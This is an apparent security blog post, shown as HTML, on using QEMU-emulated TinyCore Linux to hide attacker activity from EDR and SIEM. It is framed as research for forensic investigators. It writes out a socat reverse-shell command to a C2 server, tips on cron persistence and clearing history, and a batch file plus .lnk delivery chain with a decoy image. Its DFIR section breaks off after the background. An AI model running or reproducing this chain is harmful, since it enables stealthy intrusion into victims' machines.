@@ -1,0 +1,1381 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://a1l4m.github.io/index.html/">
+      
+
+
+	<meta property="og:url" content="https://a1l4m.github.io/index.html" />
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+      
+      
+	  <link rel="icon" href="https://a1l4m.github.io/favicon.ico" type="image/x-icon">
+
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.46">
+    
+    
+      
+        <title>Using Emulated Linux Environments as an Anti-Forensics technique</title>
+		<meta property="og:title" content="Using Emulated Linux Environments as an Anti-Forensics technique" />
+      	<meta property="og:description" content="Exploring how virtualization, specifically using QEMU, can create such blind spots for existing solutions. This discussion will address both perspectives: how attackers can use virtualization to stage malware and how forensic investigators can detect and analyze these activities." />
+		 <meta property="og:image" content="img/main.png">
+		<meta property="og:image:width" content="1200" />
+		<meta property="og:image:height" content="627" />
+		<meta property="og:type" content="website" />
+    
+      <link rel="stylesheet" href="assets/stylesheets/main.6f8fc17f.min.css">
+      
+        
+        <link rel="stylesheet" href="assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="extra.css">
+    
+    <script>__md_scope=new URL(".",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="orange" data-md-color-accent="indigo">
+<a id="back-arrow" href="../../index.html" 
+   style="
+       position: fixed; 
+       top: 20px; 
+       left: 200px; /* Keep it near the left edge */
+       text-decoration: none; 
+       font-size: 22px; 
+       z-index: 1000;
+       transition: opacity 0.3s ease-in-out;
+       opacity: 0; /* Initially hidden */
+   ">
+   ← Home
+</a>
+<script>
+    const backArrow = document.getElementById("back-arrow");
+
+    function updateArrowVisibility() {
+        if (window.scrollY === 0) {
+            backArrow.style.opacity = "1"; // Show the back arrow
+        } else {
+            backArrow.style.opacity = "0"; // Hide the back arrow
+        }
+    }
+
+    window.addEventListener("scroll", updateArrowVisibility);
+    window.addEventListener("load", updateArrowVisibility);
+</script>
+
+
+
+
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#using-emulated-linux-environments-as-an-anti-forensics-technique" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="." title="My Docs" class="md-header__button md-logo" aria-label="My Docs" data-md-component="logo">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+        <path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54" />
+      </svg>
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+        <path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z" />
+      </svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">My Docs</span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            Using Emulated Linux Environments as an Anti-Forensics technique
+          </span>
+        </div>
+      </div>
+    </div>
+    <label class="md-header__button md-icon" for="__search">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+        <path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5" />
+      </svg>
+    </label>
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="." title="My Docs" class="md-nav__button md-logo" aria-label="My Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Using Emulated Linux Environments as an Anti-Forensics technique
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="." class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Using Emulated Linux Environments as an Anti-Forensics technique
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-rise-of-virtualization" class="md-nav__link">
+    <span class="md-ellipsis">
+      The Rise of Virtualization
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setting-up-the-emulated-environment" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting Up the Emulated Environment
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Setting Up the Emulated Environment">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-download-and-prepare-required-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Download and Prepare Required Tools
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-emulating-the-environment-with-qemu" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Emulating the Environment with QEMU
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-establishing-a-connection-with-the-c2-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Establishing a Connection with the C2 Server
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 3: Establishing a Connection with the C2 Server">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-socat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using socat
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-delivering-the-emulated-environment" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: Delivering the Emulated Environment
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 4: Delivering the Emulated Environment">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#preparing-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Preparing Files
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Preparing Files">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bat-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      .bat File
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lnk-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      .lnk File
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#implications-for-dfir" class="md-nav__link">
+    <span class="md-ellipsis">
+      Implications for DFIR
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Implications for DFIR">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#background" class="md-nav__link">
+    <span class="md-ellipsis">
+      Background
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#investigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Investigation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Investigation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#initial-investigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Initial Investigation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#analysis-of-suspicious-downloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysis of Suspicious Downloads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#memory-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Memory Analysis
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network-connections-and-backdoor-identification" class="md-nav__link">
+    <span class="md-ellipsis">
+      Network Connections and Backdoor Identification
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#customization-of-the-qemu-image" class="md-nav__link">
+    <span class="md-ellipsis">
+      Customization of the QEMU Image
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-the-emulated-environment-to-connect-to-the-host" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using the Emulated Environment to connect to the host
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#timeline-breakdown" class="md-nav__link">
+    <span class="md-ellipsis">
+      Timeline Breakdown
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Timeline Breakdown">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#additional-insights" class="md-nav__link">
+    <span class="md-ellipsis">
+      Additional Insights:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#observations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Observations:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusion
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#additional-resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Additional resources
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-rise-of-virtualization" class="md-nav__link">
+    <span class="md-ellipsis">
+      The Rise of Virtualization
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setting-up-the-emulated-environment" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting Up the Emulated Environment
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Setting Up the Emulated Environment">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-download-and-prepare-required-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Download and Prepare Required Tools
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-emulating-the-environment-with-qemu" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Emulating the Environment with QEMU
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-establishing-a-connection-with-the-c2-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Establishing a Connection with the C2 Server
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 3: Establishing a Connection with the C2 Server">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-socat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using socat
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-delivering-the-emulated-environment" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: Delivering the Emulated Environment
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 4: Delivering the Emulated Environment">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#preparing-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      Preparing Files
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Preparing Files">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bat-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      .bat File
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lnk-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      .lnk File
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#implications-for-dfir" class="md-nav__link">
+    <span class="md-ellipsis">
+      Implications for DFIR
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Implications for DFIR">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#background" class="md-nav__link">
+    <span class="md-ellipsis">
+      Background
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#investigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Investigation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Investigation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#initial-investigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Initial Investigation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#analysis-of-suspicious-downloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysis of Suspicious Downloads
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#memory-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Memory Analysis
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network-connections-and-backdoor-identification" class="md-nav__link">
+    <span class="md-ellipsis">
+      Network Connections and Backdoor Identification
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#customization-of-the-qemu-image" class="md-nav__link">
+    <span class="md-ellipsis">
+      Customization of the QEMU Image
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-the-emulated-environment-to-connect-to-the-host" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using the Emulated Environment to connect to the host
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#timeline-breakdown" class="md-nav__link">
+    <span class="md-ellipsis">
+      Timeline Breakdown
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Timeline Breakdown">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#additional-insights" class="md-nav__link">
+    <span class="md-ellipsis">
+      Additional Insights:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#observations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Observations:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusion
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#additional-resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Additional resources
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="using-emulated-linux-environments-as-an-anti-forensics-technique">Using Emulated Linux Environments as an Anti-Forensics technique</h1>
+<p>Most anti-forensics techniques I encounter revolve around deletion—be it event logs, shadow copies, artifacts, or even traces like the tools and scripts used. While these methods are concerning, their impact is mitigated by centralized logging solutions like SIEM or SOAR, which store this information in real-time, allowing investigators to recover and analyze the logs.</p>
+<p>But what about techniques that don’t rely on deletion at all? Instead, they aim to prevent the generation of logs in the first place. These methods create blind spots—elusive areas that evade detection by EDRs, SIEMs, or even manual artifact analysis.</p>
+<p>Today, we’ll explore how virtualization, specifically using QEMU, can create such blind spots for existing solutions. This discussion will address both perspectives: how attackers can use virtualization to stage malware and how forensic investigators can detect and analyze these activities.</p>
+<h2 id="_1"><img alt="Background Image" src="img/main.png" /></h2>
+<h2 id="the-rise-of-virtualization">The Rise of Virtualization</h2>
+<p>Virtualization itself is not new. Back in 2019, users reported a <code>qemu-system-x86_64</code> process consuming 100% of their CPU on Macs. This turned out to be linked to a malware campaign, "LoudMiner," which used QEMU to mine cryptocurrencies like Monero (<code>XMRig</code>) via cracked VST software. 
+<a href="https://www.welivesecurity.com/2019/06/20/loudminer-mining-cracked-vst-software/">Source: ESET</a></p>
+<p>While LoudMiner leveraged virtualization for cryptojacking, we can extend this concept further. Imagine using a virtualized environment to perform malicious operations entirely within an emulated Linux instance, isolated from the host’s monitoring systems. After completing the operation—whether it’s data exfiltration, ransomware deployment, or targeted file manipulation—the attacker transfers the results to the host. This approach bypasses traditional detection mechanisms, creating a significant challenge for defenders.</p>
+<hr />
+<h2 id="setting-up-the-emulated-environment">Setting Up the Emulated Environment</h2>
+<p>To demonstrate this technique, we’ll set up a Linux image, customize it with tools and scripts, and prepare it for delivery to the victim.</p>
+<hr />
+<h3 id="step-1-download-and-prepare-required-tools">Step 1: Download and Prepare Required Tools</h3>
+<ol>
+<li>
+<p><strong>Download QEMU:</strong>
+    Visit the official <a href="https://qemu.weilnetz.de/w64/">QEMU website</a> and download the desired version. For this example, we’ll use the latest version available at the time of writing (<code>20241124</code>). Install it on your machine.</p>
+</li>
+<li>
+<p><strong>Download TinyCore Linux:</strong>
+    Obtain the ISO image of TinyCore Linux, a minimal Linux distribution, from the <a href="https://distro.ibiblio.org/tinycorelinux/downloads.html">TinyCore Linux website</a>.</p>
+</li>
+</ol>
+<hr />
+<h3 id="step-2-emulating-the-environment-with-qemu">Step 2: Emulating the Environment with QEMU</h3>
+<ol>
+<li>
+<p><strong>Create a Virtual Disk Image:</strong></p>
+<ul>
+<li>Command: <code>qemu-img create -f qcow2 tc.img 500M</code></li>
+<li><strong>Explanation:</strong> This creates a 500MB virtual disk file in the QCOW2 format, which will serve as the storage for the virtual machine.</li>
+</ul>
+</li>
+<li>
+<p><strong>Boot the TinyCore Linux ISO:</strong></p>
+<ul>
+<li>Command: <code>qemu-system-x86_64.exe -cdrom ./TinyCore-current.iso -hda tc.img -boot d -m 512</code></li>
+<li><strong>Explanation:</strong> <ul>
+<li><code>-cdrom</code>: Specifies the ISO file to boot.</li>
+<li><code>-hda</code>: Points to the virtual disk created earlier.</li>
+<li><code>-boot d</code>: Boots from the CD-ROM.</li>
+<li><code>-m 512</code>: Allocates 512MB of memory to the virtual machine.</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>Once the emulated environment is running, you can install necessary tools and configure services like SSH for remote control.</p>
+</blockquote>
+</li>
+<li>
+<p><strong>Install Tools and Configure SSH:</strong></p>
+<ul>
+<li>
+<p><strong>Commands:</strong></p>
+<ul>
+<li><code>tce-load -wi vim</code>: Installs the <code>vim</code> text editor.</li>
+<li><code>tce-load -wi openssh</code>: Installs the <code>openssh</code> package for SSH access.</li>
+<li><code>ssh-keygen -t rsa</code>: Generates SSH keys.</li>
+<li><code>ssh-copy-id user@your-server-ip</code>: Copies the SSH key to the specified server.</li>
+</ul>
+</li>
+<li>
+<p><strong>Explanation:</strong> These commands prepare the emulated environment for remote access, enabling attackers to control it from their C2 server.</p>
+</li>
+</ul>
+</li>
+</ol>
+<hr />
+<h3 id="step-3-establishing-a-connection-with-the-c2-server">Step 3: Establishing a Connection with the C2 Server</h3>
+<p>In this section we have tons of ways, literally we can go with any C2 binary like sliver, coabltstrike, havoc etc..</p>
+<p>Or we can go something like Chisel which bridges the gap using a tunneling channel. You can read more about chisel from here and how to use it <a href="https://jieliau.medium.com/chisel-tool-for-your-lateral-movement-dd3fb398c696">Chisel for Lateral movement</a> </p>
+<p>Also we can use complettely legitimate techniques like reverse SSH or socat, For testing purposes i will go with socat.</p>
+<h4 id="using-socat">Using socat</h4>
+<ul>
+<li>
+<p>On the C2 server:</p>
+<ul>
+<li><code>socat -d -d TCP-LISTEN:4444 STDOUT</code></li>
+</ul>
+<p><img alt="C2 Server Listener" src="img/C2ServerListener.png" /></p>
+</li>
+<li>
+<p>On the emulated environment (TinyCore):</p>
+<ul>
+<li><code>socat TCP:&lt;public-ip&gt;:4444 EXEC:/bin/bash</code> </li>
+</ul>
+<p><img alt="TinyCore emulator connector" src="img/TinyCoreConnect.png" /></p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>You can put this command in crontabs or using any presistence technique to run every minute to connect back to the C2 as we will be dlivering this later as intitial access.</p>
+</div>
+</li>
+</ul>
+<p>One you have typed the command on the emualted enviornement you will recive a bash shell on your C2
+    <img alt="Connection To C2" src="img/C2Connect.png" /></p>
+<blockquote>
+<p>This is just s aimple implementation of communication between the C2 and the emmulator but you can go wild with that as much as you want.</p>
+</blockquote>
+<hr />
+<h3 id="step-4-delivering-the-emulated-environment">Step 4: Delivering the Emulated Environment</h3>
+<p>Now that the environment is ready, We need to deliver QEMU files and the <code>tc.img</code> that we customized, along with a PowerShell or batch file to start the emulated environment in the background.</p>
+<p>Additionally, we want a single-click method for the victim to execute this setup. The <code>lnk</code> file technique is a perfect choice for this purpose.</p>
+<hr />
+<h4 id="preparing-files">Preparing Files</h4>
+<p>We already have the QEMU files and the <code>tc.img</code>.</p>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>After customizing the environment, save your changes using the built-in script <code>filetool.sh -b</code>.<br />
+For better OPSEC, clear the command history by deleting <code>.ash_history</code> in the root directory.</p>
+</div>
+<h5 id="bat-file">.bat File</h5>
+<pre><code>    @ECHO OFF
+
+    set "targetDir=%HOMEPATH%\datax\data"
+    if not exist "%targetDir%" mkdir "%targetDir%"
+
+    (
+       echo %USERNAME%
+    ) &gt; "%targetDir%\usercontext.txt"
+
+    explorer.exe https://forum.hestiacp.com/uploads/default/original/2X/9/9aae76309a614c85f880512d8fe7df158fec52cc.png
+    START /B %HOMEPATH%\datax\data\qemu.exe -drive file=%HOMEPATH%\datax\data\tc.img -fw_cfg name=opt/usercontext,file=%HOMEPATH%\datax\data\usercontext.txt -nographic &amp;
+
+    exit
+</code></pre>
+<ul>
+<li>
+<p>Explanation:</p>
+<ul>
+<li><code>set "targetDir=%HOMEPATH%\datax\data"</code>: Defines the directory where the files will be extracted.</li>
+<li><code>if not exist "%targetDir%" mkdir "%targetDir%"</code>: Creates the directory if it doesn’t exist.</li>
+<li><code>echo %USERNAME% &gt; "%targetDir%\usercontext.txt"</code>: Saves the username to a file for later use in SSH commands.</li>
+<li><code>explorer.exe &lt;URL&gt;</code>: Opens a URL with an error message hosted on public server.</li>
+<li><code>START /B %HOMEPATH%\datax\data\qemu.exe</code>: Starts QEMU in the background, running the emulated environment.</li>
+<li><code>-drive file=&lt;path&gt;</code>: Specifies the virtual disk to load.</li>
+<li><code>-fw_cfg</code>: Adds custom firmware configuration to pass data between the emulated environment and the host.</li>
+<li><code>-nographic</code>: Will run the emulation in the background.</li>
+</ul>
+</li>
+</ul>
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<p>In our case it will pass whatever in <code>usercontext.txt</code> and share it with the emulated enviornemnet under <strong>/sys/firmware/qemu_fw_cfg/by_name/opt/usercontext/raw</strong> and we stored the username of the host there, so a command like <code>ssh $(sudo cat /sys/firmware/qemu_fw_cfg/by_name/opt/usercontext/raw)@10.0.2.2</code> will connect us to the host.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p><code>10.0.2.2</code> is the default IP that qemu assigns for the host machine, Take a look at some of the interesting driver-level functionality unique to QEMU. This would be present across any Linux distro, not just TinyCore: <a href="https://wiki.qemu.org/Documentation/Networking">Qemu Documentation for Networking</a></p>
+</div>
+</div>
+<p>You can also enhance the script by employing techniques to extract the host machine's password, such as dumping LSASS, retrieving stored credentials, or brute-forcing the password later. These techniques are not detailed here as this totally another topic.</p>
+<hr />
+<h5 id="lnk-file">.lnk File</h5>
+<p>The <code>.lnk</code> file simplifies execution for the victim by bundling the setup into a single click.</p>
+<ol>
+<li>
+<p><strong>File Placement:</strong></p>
+<ul>
+<li>Place <code>qemu.exe</code>, <code>tc.img</code>, and <code>start.bat</code> in the same directory.</li>
+<li>Zip the directory for delivery.</li>
+</ul>
+<p><img alt="Directory Content" src="img/directoryContent.png" /></p>
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<p>Zip this directory and deliver it to the victim, along with an <code>.lnk</code> file, via email or another delivery method. Refer to my blog for common delivery techniques attackers use: <a href="https://a1l4m.medium.com/understanding-threat-actors-how-they-infiltrate-systems-d8220e3f7e90">Understanding Threat Actors</a>.</p>
+</div>
+</li>
+<li>
+<p><strong>Purpose of the .lnk File:</strong></p>
+<ul>
+<li>Extracts the contents of the zip file to the <code>datax</code> directory.</li>
+<li>Executes the <code>start.bat</code> file to launch the emulation in the background because of the <code>-nographic</code> option.</li>
+</ul>
+</li>
+</ol>
+<p><img alt="lnk File Content" src="img/lnkFileContent.png" /></p>
+<p>Now we have everything in place which it will all starts when the victim clicks on the .lnk file.</p>
+<div class="admonition example">
+<p class="admonition-title">Running lnk on the victim machine</p>
+<p><video width="640" height="360" controls>
+  <source src="img/final.mp4" type="video/mp4">
+  Your browser does not support the video tag.
+</video></p>
+</div>
+<hr />
+<h2 id="implications-for-dfir">Implications for DFIR</h2>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>The investigation was approached as a real-world incident, beginning with a SIEM alert and following a thorough analysis process. We also used sliver C2 for the communication between the emulated enviornement and the attacker.</p>
+</div>
+<hr />
+<h3 id="background">Background</h3>
+<p>The SOC team has flagged unusual activity on a workstation assigned to Khalid Allam, a marketing specialist at the enterprise. The alert was triggered by the download of a <strong>150 MG</strong> file attached to an email, a behavior atypical for Khalid's role, which generally involves working with online collaboration tools rather than large local downloads. While no immediate suspicious activity was observed after the download, the incident has raised concerns due to the potential for hidden malicious intent. As part of the incident response process, you have been provided with a memory dump and a triage image of Khalid's machine to investigate further. Your task is to determine if any malicious artifacts, unauthorized activity, or signs of compromise are present, ensuring the environment's security remains intact.</p>
